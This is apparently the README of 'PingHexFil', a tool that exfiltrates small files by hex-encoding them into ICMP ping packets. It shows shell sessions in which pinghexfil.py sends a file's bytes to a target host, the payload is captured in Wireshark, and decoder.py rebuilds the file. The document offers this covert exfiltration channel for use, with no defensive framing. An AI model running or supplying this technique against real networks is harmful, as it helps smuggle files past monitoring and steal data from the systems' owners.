# PingHexFil
Exfiltration of small files using ICMP
## Data Exiltration using ICMP
*NOTE* This ONLY works with files smaller than 60kB. This is due to the packet length restrictions and updates will come to break up files into 60kB chunks in the near future.
## Usage
The following is done with the example file, `examples/example1.txt`
### Step 1: Send the Bytes via ICMP
```
root@demon:~/pinghexfil# ls
decoder.py  examples  images  payloads  pinghexfil.py  README.md
root@demon:~/pinghexfil# cat examples/example1.txt 
This is a test file.
OK.
root@demon:~/pinghexfil# ./pinghexfil.py 127.0.0.1 examples/example1.txt 
[+] Opening file: examples/example1.txt
[+] Sending data as: 54686973206973206120746573742066696c652e0a4f4b2e0a
.
Sent 1 packets.
Exiting.
root@demon:~/pinghexfil# 
```
### Step 2: Gather Bytes via Wireshark
Simply right click on the data and choose **Select->as a Hex Stream** and paste the output into a file, as I did in the file `payloads/example1.txt`
![Wireshark Screenshot](images/wireshark.png)

### Step 3: Decode the Bytes
```
root@demon:~/pinghexfil# ./decoder.py payloads/example1.txt 
[+] Opening file: payloads/example1.txt
[+] file data: 54686973206973206120746573742066696c652e0a4f4b2e0a

This is a test file.
OK.

root@demon:~/pinghexfil# 
```
